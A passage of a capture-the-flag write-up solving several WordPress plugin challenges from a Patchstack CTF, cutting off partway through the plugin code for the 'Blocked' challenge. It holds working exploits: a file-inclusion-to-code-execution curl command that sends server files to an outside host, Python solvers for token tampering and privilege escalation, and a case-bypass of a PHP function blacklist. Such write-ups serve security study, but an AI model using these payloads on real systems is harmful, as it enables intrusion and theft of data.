---
id: 1a348583-e65d-80e8-9ea1-fdb8caf29843
title: Patchstack Alliance CTF S02E01 - WordCamp Asia
created_time: 2025-02-23T13:15:00.000Z
last_edited_time: 2025-05-22T08:00:00.000Z
cover_image: ./imgs/ctf-asia_Iv836woO.jpg
categories:
  - wordpress
verification:
  state: unverified
  verified_by: null
  date: null
page: Patchstack Alliance CTF S02E01 - WordCamp Asia
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/ctf-asia_Iv836woO.jpg

---

Last weekend, I participated in the Patchstack WCUS CTF and solved all the WordPress challenges. Here's my write-up for each challenge from the Patchstack WCUS CTF 2025.

# **A Nice Block**

| Solves | 20 |
| ------ | -- |

Description

    I like the new Gutemberg editor, so I just installed a plugin with beautiful blocks addons. That's a great plugin that perfectly matches my design needs, I don't think it could cause a security issue, right?

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/736f5211-8c00-4e4f-9e48-c22e22fa0847/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666QYG3XBS%2F20250524%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250524T044357Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJHMEUCIQCpU99WKSIoWaRzixScsDij4ju%2BJoo3ynSZP4myOxuPkAIgTSJENhY8vwgNqwQG0fFwM4QsbOK%2FIjNvK9UfXnsYNM4qiAQI%2Ff%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGvn6auAVZ1Tk%2FAzqCrcAxs6sftgch5zGWVDL77%2B%2BhBW12dkribDM9h%2FvARF%2F4HeDiRNnTcVYuGOJAheZU5hVRZxBjo6s7rMTMxER80RmKyr%2FBtj8odJSALw4ADo3l5IWHMZMGUOyqitPhAbakXBhz%2Fe4JMviP%2Fg%2B6bVJTRqcy0ym%2BHA4wUleYVo2xRq3HpceSRIxPh3h4Q%2BDBAor7mWtAei6YdkRqLP%2B55jaLesF%2F4uMwx%2B3AvdYsOV%2B0eViQWfuFLZhIhEZ58Ps4n1uOPB9E%2BDyska2MZbSMxQDl%2F%2Bsr5INtbYzyLE6CUIwD9P6DgFNgBnVusC9wg8ppXIPTWQNt5mt3bRGRhexPMyp9YVhdO7EzgrKzDQVB3XjyaoCm%2B43Tc6cBNM2gqpA7yw%2FhjqG1sFNAkIvr4dtV9MtRJqKhRD5asa69JGMdRhJa2lu1Z99ZOOLyQ%2BG%2BewA7MiBFaLb5KBmj%2FMZViFI20Y%2BRKqGgrytDGFYntTAp6ga99w2sjMjxInR2TIn%2FOH4Xsuc2E0%2F%2FhFy6cTilEfxQglbk3PzrgDUh%2BacbNscB2IBB%2FNsrJHHsayrOudgTMqHS%2FolxBE188P4a9Z0nxIcPP0mlbUR%2BSAtICp4%2BDIJlNUW4NgTRdo9jnkCk%2FxFWz1AYpCMKySxcEGOqUBCiYFJtYPenj0L7qVJ11JyOCZwK5uBgj%2B4Zzzg1bwP4gcqyfPfhbCY8EeTuqf%2Fgsq76SJTA20n0GBOiDRcB%2Fw5aRIHoSrdpi%2BRnE7kBhKRSBeq%2FD6TVhye6dGkhFLT5KxHVeUgf2HYIL4KfZJu2HfENRiQCGDge%2FP%2FIt1T%2BNbz%2FBz53D8Pi7uWmzPYLpFcJL7V2p9MRBgGEwQFeIBHSoembuCZdSh&X-Amz-Signature=764d0f6de90c2fe6d4b354d884777580ec4fe8f0950566ed66a6668e8b6ad276&X-Amz-SignedHeaders=host&x-id=GetObject)

References

    - [https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly](https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly)

    - [https://hackmd.io/@Solderet/AngstromCTF2023#Filestore---Web](https://hackmd.io/@Solderet/AngstromCTF2023#Filestore---Web)

***

Using Semgrep and my Semgrep custom rules, we can easily identify the vulnerable code parts. Here are the Semgrep results:

![](./imgs/image_40dZWs5o.png)

It’s Local File Inclusion, and if it’s using dockerized PHP, it can be easily exploited using this technique: <https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly>

## Solver

```bash
curl "http://52.77.81.199:9100/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?tab=../../../../../../../../../../usr/local/lib/php/peclcmd.php&+run-tests+-i+-r\"system(hex2bin('$(echo "curl 77.37.47.226:4444 -d \"`cat /*`\"" | hexdump -v -e '/1 "%02x"' | tr -d '\n')'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt"
```

### Flag

![](./imgs/image_gT22iTmO.png)

# **Patchstack Scheduler Pro**

| Solves | 18 |
| ------ | -- |

Description

    Patchstack needed to update their Blog content and asked a freelancer to make a plugin for scheduling their newest advisories. It has not been tested yet can you check it for us?

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/db2d4cd5-920a-47fb-82d9-c3fc43e239d0/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662IMHFMDU%2F20250524%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250524T044403Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJGMEQCIEee8GuEZDm5iC7PFW1IcjtPYmH8bwaikwl34NMzB89NAiBF7NzVV2mifNBDPHTpPNwi1%2FWeAVBbummrfG9pBICWqyqIBAj9%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMGQ%2BtSjkHIbQLwuOaKtwDNsCRqQ29f%2B4Yceb8xWhNNqjuAQ%2B%2B6F2WCv3IyayJLyIflIKffr%2BcdIgNV6RLbQqNKR5jgTcDFNKfgSVjvbL8genO%2F0av9RtyrWWdxNQMqGqZrZtXiDgmlo7LogEAkTQp6UsRNondAfB9IFfJhLEI2W7%2FNfh3n8kbYNfVmwApP7duklvb7C2572gCLG9REWnJv%2FGuv7PzvX%2FyzTRxXoXgHKwEg%2FIMMtM%2BIm%2B%2FIJ%2BsGcVRJxHrWzP0EAlAYH2v6NXmxUkvpBa08ESjQH3r%2BjRi8D32h8yeA8gq8LGYLbuuiXsG%2BR0RKOJWnTTmrX1euWOFrm4lDSmPZWDuLUMI3CWE14M7jKbz2JuqbSGuuwF0liTzdy1lIgO8Utu9GnoittDk%2F3P%2BMPhcakFywRnbwNCYroZJvenGDxsjNXj9D%2FMrmmvzGfYc1sjSMkXuR7MfbFMjpDHXkUZxEwrR%2FtwEFPUt4YFYxO5csA3vvHDUGYFXwWauEezlQ3nEy4O9r5YDXtHjR7%2FxobPlq2n7%2Bm99XZaMdJU%2B%2BgeDIaw%2FJ%2Bpfxoll5KGZvMXLCzq1mVOTkI7pZQi8fM6JHeVaB8lMFFR5fEy9PT%2FunpsA4A3CkviVumGtHFVx0ArZk5i%2FL0KfxMAwyZLFwQY6pgGoRI5sdX5xSascfB5W9U814R%2B%2B7l7OEy94xj6IskHUnaoDsEnP5SfEbwu0T6bywSGLzmzxRGc42BG8YRKJdHvPzFLYiPtRJYWSotpz8ErD2xXEDcCKWlmQ7r%2BFDnH6vH3vOVbPx4V6RoZkslgT7cGbOeu%2BVphI7V66VOrX63%2BdMMHb9SuoRfQU925vmO2aq4IOXp4J7OatTXCk9%2FUxZOZrG7wixeQo&X-Amz-Signature=a31eaf0e9776ece1bf3136bec2eb3fe7e3d2f3a0deb843829776f05a5cfca79b&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

This challenge is vulnerable to information disclosure, PHP type juggling, some encryption logic failures, and token tampering. Here is the order of exploitation:

*   First, exploit information disclosure to get the `api_token`.

*   Use PHP type juggling to bypass this check: `$data['encryption_key'] != $this->encryption_key`.

*   Reuse the UUID to decrypt and get the `encryption_key`:

    Related method:

          ```php
              private function get_encrypted_config() {
                  $config = array(
                      'status' => 'draft',
                      'permissions' => array(
                          'view' => true,
                          'edit' => false
                      ),
                      'encryption_key' => $this->encryption_key
                  );
                  
                  $uuid = substr($this->encryption_key, 0, 16);
                  $encrypted = openssl_encrypt(
                      json_encode($config),
                      'AES-256-CBC',
                      $uuid,
                      0,
                      $uuid
                  );
                  
                  return base64_encode($uuid . base64_decode($encrypted));
              }
          ```

*   Finally, use the `encryption_key` to tamper with the token so we can access the flag.

## Solver

poc.py

    ```python
    import httpx
    import asyncio
    import re
    import json
    import subprocess

    # URL = "http://172.26.119.33:9192/"
    URL = "http://52.77.81.199:9192/"
    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.AsyncClient(base_url=url)

        def wp_login(self, username: str, password: str) -> None:
            return self.c.post("/wp-login.php", data={
                "log": username,
                "pwd": password
            })
        def handle_preview_request(self, post_id):
            return self.c.get("/wp-admin/admin-ajax.php", params={
                "action": "patchstack_scheduler_preview",
                "post_id": post_id
            })
        def patchstack_scheduler_compare(self, api_token):
            return self.c.post("/wp-admin/admin-ajax.php?action=patchstack_scheduler_compare", json={
                "api_token": api_token,
                "encryption_key": True,
                "revision_data": {
                    "post_status": "draft",
                }
            })
        def handle_settings_request(self, config):
            return self.c.post("/wp-admin/admin-ajax.php?action=patchstack_scheduler_settings", json={
                "config": config
            })
    class API(BaseAPI):
        def encrypt_config(self, config: dict, encryption_key: str) -> str:
            # Call the PHP script to encrypt the config
            result = subprocess.run(
                ['php', 'decrypt.php', 'encrypt', json.dumps(config), encryption_key],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                raise Exception("Error encrypting config: " + result.stderr)
            
            return result.stdout.strip()

        def decode_encrypted_config(self, encrypted_config: str) -> dict:
            # Call the PHP script to decrypt the config
            result = subprocess.run(
                ['php', 'decrypt.php', 'decrypt', encrypted_config],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                raise Exception("Error decrypting config: " + result.stderr)
            
            return json.loads(result.stdout)

    async def main():
        api = API()
        token = ""
        for i in range(100):
            res = await api.handle_preview_request(i)
            if "API Token" in res.text:
                token = re.findall(r"API Token: (.*?)\"", res.text)[0]
                break
        res = await api.patchstack_scheduler_compare(token)
        encrypted_config_b64 = res.json()['data']['encrypted_config']
        
        # Decode the encrypted config using PHP
        decrypted_config = api.decode_encrypted_config(encrypted_config_b64)
        encryption_key = decrypted_config["encryption_key"]

        # Example of encrypting a new config
        new_config = {
            'status': 'publish',
            'permissions': {
                'all': True,
            },
            "flag_access": True
        }
        encrypted_config = api.encrypt_config(new_config, encryption_key)
        print("Encrypted Config:", encrypted_config)

        res = await api.handle_settings_request(encrypted_config)
        print(res.text)

        
        

    if __name__ == "__main__":
        asyncio.run(main())

    ```

decrypt.php

    ```php
    <?php
    function encrypt_config($config, $encryption_key) {
        $uuid = substr($encryption_key, 0, 16);
        $encrypted = openssl_encrypt(
            json_encode($config),
            'AES-256-CBC',
            $encryption_key,
            0,
            $uuid
        );

        return base64_encode($uuid . base64_decode($encrypted));
    }

    function decrypt_config($encrypted_config) {
        $decoded_data = base64_decode($encrypted_config);
        $uuid = substr($decoded_data, 0, 16);
        $encrypted = substr($decoded_data, 16);
        
        $decrypted = openssl_decrypt(
            base64_encode($encrypted),
            'AES-256-CBC',
            $uuid,
            0,
            $uuid
        );

        return json_decode($decrypted, true);
    }

    if (isset($argv[1]) && isset($argv[2])) {
        $action = $argv[1];
        $data = $argv[2];
        $encryption_key = $argv[3];

        if ($action === 'encrypt') {
            $encrypted_config = encrypt_config(json_decode($data, true), $encryption_key);
            echo $encrypted_config;
        } elseif ($action === 'decrypt') {
            $decrypted_config = decrypt_config($data);
            echo json_encode($decrypted_config);
        }
    }
    ?>
    ```

### Flag

![](./imgs/image_uK380fdn.png)

# **Sup3rcustomiz3r**

| Solves | 11 |
| ------ | -- |

Description

    My friend is developing a cool plugin to help me customize my Login page, isn't that nice? So many stuff and options, I'm sure it's 100% safe to use...

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/61f45406-c096-4a5f-a60e-06f2548f7448/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665AYU5VB7%2F20250524%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250524T044405Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJHMEUCIBGJsOF4qfPOt14oG7HLN7t%2Ba0TzK7LdOo9cqRh8D8CVAiEA806r%2B1m%2BxrXEGZ3jWZQjnAH6SSTsT5dbgG21djGAH4EqiAQI%2Ff%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDBlNK0gmBpv4Bf1plSrcA8u18QXeEWotLdE1QKPhWK0PJ6SCMXJEFfjUICEA%2BtEMSsO9LHz%2BwVH%2F91NkbNGiqRLJ28aDIv5p8d1keqgX2RimcWQJWvzc6h25lkeXv7UgB56GVNircFmPLl4%2Ffd6vx6Z06TRGqRhfbB8Wk6onTfwWrpvW7ztZgGGuBt68Ykc0GjJ6tdyF%2BAO%2BePHtPKXYwLDfw9NVR6IKfHIxzfNRJC0wEnyNm7Dx29kg3girUUes7nvRyFX4KV6oQpAfNxyEdp6iVfafHlzfmuwgTNPNGMt2noJKC6WwV%2BMYrwk3kV%2BXCRKnwkoYCJ%2FaFsllzl5cHVlC1eg6YVQwp%2BI1A4efe2K0Q2KnPiW9tue2C%2FIu2LUnrPXHj02n7V7oNbPGMBR0tv5hU8tjkKohNmE0ts%2BkZP4drSOgjvJh6eUC%2FDqbCmTpSki5j6rcnP%2FfK8RzfnOfhdbVkiTgsKv0nyXcoLzCq5tJpkB7UtXvBFC37BhhL8IP9JKRlsM2lvHhVizZ7ZP11ewfZye0pC91b22dS8vAmZ8FUDBFUFRn7%2BZg9RXgI34PKzq0ZunFGhkQ5dMWTYjuq7Q8tZYtTV4G98qPgq%2ByCmS4hggqot7tLR3LAzKxhyRut155E7YNFYBt5D5hMM2SxcEGOqUB3FOf2ACCJRB%2Bxl5nMotAZ6vY28rLUz2MozOurvwO1m%2FJWracmsEF%2F2z%2Bm5Mgr20zRBbXGJhqmz4J7E2PEjMQq9LYo7Zb9RqZ3wEMkcq0xyQkOVeLOFemKsFh3gldV7g5Zp%2BPD9nafsDT698qQE9FiNSW8L9z9aCKVRQ7bT6wRxxk2KSgpVVd%2BytsGfNb51wzUaf7acmTGqFYR%2B9nKxVfoOBo3Pdy&X-Amz-Signature=a4cacdeed084df3a37aa416c7b5d0b883ed6217fd2d1fbe2e2fc4287a6eaf52d&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we will exploit one vulnerability: arbitrary option update. The flag is stored in `patchstack_get_the_flag` and can be accessed via this unauthenticated AJAX action:

```php
add_action("wp_ajax_nopriv_patchstack_get_the_flag", "get_the_flag");

```

```php
function get_the_flag()
{
    $user = wp_get_current_user();
    $allowed_roles = ["administrator", "author", "contributor"];
    if (array_intersect($allowed_roles, $user->roles)) {
        $value = file_get_contents('/flag.txt');
        wp_send_json_success(["value" => $value]);
    } else {
        wp_send_json_error("Unauthorized");
    }
}

```

We need to have an administrator, author, or contributor role to view the flag.

First, we need to register using this `nopriv` AJAX action:

```php
add_action('wp_ajax_nopriv_login_register_user', array($this, 'login_register_user'));

```

```php
function login_register_user() {
    $username = sanitize_user($_POST['username']);
    $email = sanitize_email($_POST['email']);
    $password = $_POST['password'];

    if (empty($username) || empty($email) || empty($password)) {
        wp_send_json_error(array(
            'message' => 'All fields (username, email, password) are required.',
        ));
    }
    if (!is_email($email)) {
        wp_send_json_error(array(
            'message' => 'Invalid email address.',
        ));
    }
    if (username_exists($username) || email_exists($email)) {
        wp_send_json_error(array(
            'message' => 'Username or email already exists.',
        ));
    }

    $user_id = wp_create_user($username, $password, $email);
    update_option('default_role', 'subscriber');

    if (is_wp_error($user_id)) {
        wp_send_json_error(array(
            'message' => $user_id->get_error_message(),
        ));
    }

    wp_send_json_success(array(
        'message' => 'User registered successfully.',
        'user_id' => $user_id
    ));
}

```

Next, we can access this AJAX action that requires authentication:

```php
add_action('wp_ajax_login_customizer_set_option', array($this, 'set_option'));

```

```php
function set_option() {
    if (isset($_POST['_wpnonce']) && wp_verify_nonce(sanitize_text_field(wp_unslash($_POST['_wpnonce'])), 'login-customizer-admin')) {
        $op = sanitize_text_field($_POST['option']);
        $val = sanitize_text_field($_POST['value']);
        update_option($op, $val);
        wp_send_json_success('Option has been saved', 201);
    }
}

```

This AJAX action will update our user-supplied option, which means we can set the `default_role` option to, for example, "contributor" so we can read the flag in the `patchstack_get_the_flag` AJAX action. After setting the `default_role`, we can register a new user, and this time the role will be set as "contributor" because we set it before using the `default_role` option. Lastly, we get the flag in the `patchstack_get_the_flag` AJAX action.

## Solver

solver.py

    ```python
    import httpx
    import asyncio, re, random

    URL = "http://52.77.81.199:9193/"

    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.AsyncClient(base_url=url)

        def wp_login(self, username: str, password: str) -> None:
            return self.c.post("/wp-login.php", data={
                "log": username,
                "pwd": password
            })
        def login_register_user(self, username, email, password):
            return self.c.post("/wp-admin/admin-ajax.php?action=login_register_user", data={
                "username": username,
                "email": email,
                "password": password,
            }) 
        def login_customizer_set_option(self, nonce, option: str, value: str) -> None:
            return self.c.post("/wp-admin/admin-ajax.php?action=login_customizer_set_option", data={
                "option": option,
                "value": value,
                "_wpnonce": nonce
            })
        def patchstack_get_the_flag(self):
            return self.c.get("/wp-admin/admin-ajax.php?action=patchstack_get_the_flag")

    class API(BaseAPI):
        async def get_nonce(self):
            res = await self.c.get("/?preview=1")
            return re.findall("_ldAdminNounce = (.*?)\"", res.text)[0]

    async def main():
        api = API()
        username = "dimas"
        password = "dimas"
        res = await api.login_register_user(username, "dimas@dimas.com", password)
        print(res.text)
        res = await api.wp_login(username, password)
        nonce = await api.get_nonce()
        res = await api.login_customizer_set_option(nonce, "default_role", "contributor")
        print(res.text)
        randomtxt = random.randbytes(4).hex()
        username = username + randomtxt
        password = password + randomtxt
        api = API()
        res = await api.login_register_user(username, f"dimas{randomtxt}@dimas.com", password)
        print(res.text)
        res = await api.wp_login(username, password)
        res = await api.patchstack_get_the_flag()
        print(res.text)


    if __name__ == "__main__":
        asyncio.run(main())

    ```

### Flag

![](./imgs/image_TvJgIAwn.png)

# **Cool Templates**

| Solves | 11 |
| ------ | -- |

Description

    I had someone build me a plugin so I can send out some links with special footers. I'm sure the code is safe, right?

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/d616c041-db7e-44b7-95ce-2ec51d2d65d5/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJQYKZ6A%2F20250524%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250524T044406Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJIMEYCIQC%2FSWhFsMl3FDDJSa9pi7aGcbK%2FKDqA8Oq9JpskFUSjnQIhAN%2FBaSlAAVpO2ig403V81Y%2B65KTxBdZ4bB4e2bea1bUoKogECP3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgzZRZUieuWeKWCf1cMq3AMSyDP9IorTT6LlGq38z6fB2DFuPmVP6rjaf7CpQhdv%2FP1GdUcqhCGN7FNqxQryqcKGrNDfyuCLaQRUuBzHDJEucaZBQ%2Ff1%2BWlSXLLTRmYmf3d3Xm%2FdQoHPeLzOar5e%2FcC1o3dd8orK2BGiAUtvrerOjg4xbSRMXNrkXkTOEQpRFs0ps6dKTbEneDuOUrmLRetI0V%2FFBH8pCW78iqeFVjTH81IvHzCvlJXPex4ymxkp4xbJtjcd7xzBSi%2BRECF7Hj6e6d8gJ1ocdoMYxqP7BYcOkfCnjYFV7KZiiAeneTNfYe81NHiSI%2FtU0H117DxPecWjGMudRUSltsc1wEn%2BjfAuxLynJeVPtYg3STGx4iizFB%2FLOVwjHIfbK1vGZ4oQGbuEAZ7TzIdBUMJr1qab3u9T6bvFnGpEYbyEGBRILqT18Kcr5TJTlEpApvfcNdggrutiiiCNuMiQmYr89oG%2Fd%2FidHwu2LVLcNVUJS8s1x3LL2XferXomAkEuHaZFUb1qFgLmaG0h%2BQArzjnmbocgGXwTXa1npjS4%2FUqPKJOxRXaU0Y4koYllLqwAjbql0v6Sr0%2Fm1VGe8fOpvg8SiXpWyy61nU7HzcE9qpZOi20jWnIWlz0%2BYQJGEq0l9YNJdzC%2FksXBBjqkARSLOsHXUCMGoDjMm2RRJV0qrpKryQn9loIwp5qrASBbBRRvDNycN7FRHUjIBV5o80FZyQUxatADoyPtsc7F7Nt6K7DkpXwuEa%2FNgF7iXszlPra5TgH9qrOWjkTmGt7vN73%2Bj7u6ueUYwkQja4zvRFN6Se61EmbY2N7MyCKXd97rbULCBFcdbkm6UgLPemaViXR6ij9KBvFVeoEYv2eirnoO2Yir&X-Amz-Signature=09b07685b2dc6dadc0b5cd1e3ecfc7836ae6940ce24559bd40924e2faa5fe792&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

There's a WAF that restricts many functions that can probably lead to RCE, but the regex is case-sensitive here:

```php
function add_custom_footer() {
    $blacklist = array("system", "passthru", "proc_open", "shell_exec", "include_once", "require", "require_once", "eval", "fopen",'fopen', 'tmpfile', 'bzopen', 'gzopen', 'chgrp', 'chmod', 'chown', 'copy', 'file_put_contents', 'lchgrp', 'lchown', 'link', 'mkdir', 'move_uploaded_file', 'rename', 'rmdir', 'symlink', 'tempnam', 'touch', 'unlink', 'imagepng', 'imagewbmp', 'image2wbmp', 'imagejpeg', 'imagexbm', 'imagegif', 'imagegd', 'imagegd2', 'iptcembed', 'ftp_get', 'ftp_nb_get', 'file_exists', 'file_get_contents', 'file', 'fileatime', 'filectime', 'filegroup', 'fileinode', 'filemtime', 'fileowner', 'fileperms', 'filesize', 'filetype', 'glob', 'is_dir', 'is_executable', 'is_file', 'is_link', 'is_readable', 'is_uploaded_file', 'is_writable', 'is_writeable', 'linkinfo', 'lstat', 'parse_ini_file', 'pathinfo', 'readfile', 'readlink', 'realpath', 'stat', 'gzfile', 'readgzfile', 'getimagesize', 'imagecreatefromgif', 'imagecreatefromjpeg', 'imagecreatefrompng', 'imagecreatefromwbmp', 'imagecreatefromxbm', 'imagecreatefromxpm', 'ftp_put', 'ftp_nb_put', 'exif_read_data', 'read_exif_data', 'exif_thumbnail', 'exif_imagetype', 'hash_file', 'hash_hmac_file', 'hash_update_file', 'md5_file', 'sha1_file', 'highlight_file', 'show_source', 'php_strip_whitespace', 'get_meta_tags', 'extract', 'parse_str', 'putenv', 'ini_set', 'mail', 'header', 'proc_nice', 'proc_terminate', 'proc_close', 'pfsockopen', 'fsockopen', 'apache_child_terminate', 'posix_kill', 'posix_mkfifo', 'posix_setpgid', 'posix_setsid', 'posix_setuid', 'phpinfo', 'posix_mkfifo', 'posix_getlogin', 'posix_ttyname', 'getenv', 'get_current_user', 'proc_get_status', 'get_cfg_var', 'disk_free_space', 'disk_total_space', 'diskfreespace', 'getcwd', 'getlastmo', 'getmygid', 'getmyinode', 'getmypid', 'getmyuid', 'create_function', 'exec', 'popen', 'proc_open', 'pcntl_exec');
    if (isset($_REQUEST['template']) && isset($_REQUEST['content'])) {
        $template = $_REQUEST['template'];
        $content = wp_unslash(urldecode(base64_decode($_REQUEST['content'])));
        if(preg_match('/^[a-zA-Z0-9]+$/', $template) && !in_array($template, $blacklist)) {
            $footer = $template($content);
            echo $footer;
        }
    }
}

add_action('wp_footer', 'add_custom_footer');

```

Because functions can be called case-insensitively, we can do something like this:

```php
SysTem("ls")
```

![](./imgs/image_JizWNzcQ.png)

And it will still call the `system` function.

## Solver

```php
curl "http://52.77.81.199:9122/?template=SyStEm&content=$(echo -n "cat /*" | base64 -w0)"
```

### Flag

![](./imgs/image_oSpxaLPn.png)

# **Blocked**

| Solves | 7 |
| ------ | - |

Description

    it's blocked, nothing to do here.

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/9ce18315-c512-4217-afd7-5776f9d39ad5/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XBG5TJN4%2F20250524%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250524T044415Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJHMEUCIQDSJqxB1h%2FwNWWO%2FBQcTxFwu2q12EUz1sVwcFKmo7e95wIgZ3CSSzxqC2kfY3g8xqrkMEcyJwe%2BrTQW4E0pEn%2F%2ByXoqiAQI%2Ff%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDCAthN0mjL8lNEbWCrcA9JMEX9wFv96rt2Ha8rbLEJAEXQUs5AxK7pg7TDmNpz1nayXAqIkFWXo2Z8KtIhPZyt%2Fijw%2FoKdaSVdrawrxOKNVlbH1mHybenitHqFm9uxEEUtiZFFdIlx5yp5Rym994V5%2BnLcj%2BDW7XRSESiOmSIemqaGwDAmLLXyIv0x%2FR8OcxKUYp7DhkgMmKHRwwD2ii1YxrCtsNddo5rCuvS%2F4eNgiF%2BLkTh89VNu%2Bzp0VIaOA%2Fbr7U%2BIfwNjO%2Bu%2BZlRzzuC2pC%2FkjDLjO%2B%2BxvbqlnrODO65msFHg1dGH4lGNGvmmOh0iZoXqi6PNGmGVf3iP19R2Yxlu5HyzPkvgBoYxT8D6UwR%2Fo9%2Fe8hSFd7otQY1vjM4VQJquY8548U3mc4wUTo7rQWITNxxW1IVgeZgdifQIPA1pc3mKNYP%2B9rRYJQ1rHhIG9vqtg%2BTXUt%2Bj3NCP3QZYKY%2BpOdYDsWDt77bitSio5ZDdxR6ah6HSnorw%2FfCiRe%2F7%2FQCTVe%2B%2FcoTT9ySC8fpIaDJMCYuMzkRheEwFXRF8jecms4gKBfeAKB4tSklGtZgRDvsg9H1N8aqPw09iABwf8DUPPyefXg3G3U1cqOt7iejo%2FiEJXeP9viq%2BWqj%2Fb8nPrQcX%2FwLdSC6HoMKGSxcEGOqUB88kiAZM1RwKiceaGmatSTvW5KqExbj0lE75ybGjqJp5%2Bzmt6sOK52vF7rIzUYpbYY4vE8rWNFvU5oyH7fpn5giJdv8FbiRnCLouWIXM%2BL4rLVHDBEJCZLZnFQQUeVir1xp0WJsPmyfiGejm6CgMBcdrT3IpK%2BRslaIT4Oqe0zmD0L%2BziumGedQodzIAtzK1DVNfrvEj1XuyBPFAYisb5myo291Iz&X-Amz-Signature=0401184f2623db822c7496f5bd2b35a40c374e2cc54bb29d664122eefe0a396e&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

plugin

    ```php
    <?php

    /**
     *
     * @wordpress-plugin
     * Plugin Name:       Test Plugin
     * Plugin URI:        http://example.com/plugin-name-uri/
     * Description:       This is a short description of what the plugin does. It's displayed in the WordPress admin area.
     * Version:           1.0.0
     * Author:            Patchstack
     * Author URI:        http://example.com/
     * License:           GPL-2.0+
     * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
     * Text Domain:       test-plugin
     * Domain Path:       /languages
     */

    // If this file is called directly, abort.

    if ( ! defined( 'WPINC' ) ) {
    	die;
    }

    define( 'PLUGIN_NAME_PLUGIN_NAME', 'test-plugin' );
    define( 'PLUGIN_NAME_VERSION', '1.0.0' );
    define( 'PLUGIN_NAME_URL', plugin_dir_url( __FILE__ ) );
    define( 'PLUGIN_NAME_PATH', plugin_dir_path( __FILE__ ) );
    define( 'PLUGIN_NAME_BASE_DIR', plugin_dir_path( __FILE__ ) );
    define( 'PLUGIN_NAME_BASE_NAME', plugin_basename( __FILE__ ) );

    add_action("init", "set");
    add_action("rest_api_init", "register_endpoints");

    function set(){
        update_option("secretword_is_true", "anything");
    }

    function register_endpoints(){
        register_rest_route( 'test', '/upload/(?P<somevalue>\w+)', [
            'methods' => WP_Rest_Server::CREATABLE,
            'callback' => 'upload_something',
            'permission_callback' => 'check_request',
        ]);
    }

    function check_request( $request ) {
        $some_value = trim( strtolower( $request['somevalue'] ) );
        if( empty( $some_value ) ) {
           return false;
        }
     
        if( ! preg_match( '/^secretword_/i', $some_value) ) {
           return false;
        }
     
        if( $some_value == 'secretword_is_true' ) {
           return false;
        }
        return true;
    }

    function upload_something($request){
        $body = $request->get_json_params();
        $content = $body['content'];
        $name = $body['name'];
        $some_value = trim( strtolower( $request['somevalue'] ) );
        if(!get_option($some_value)){
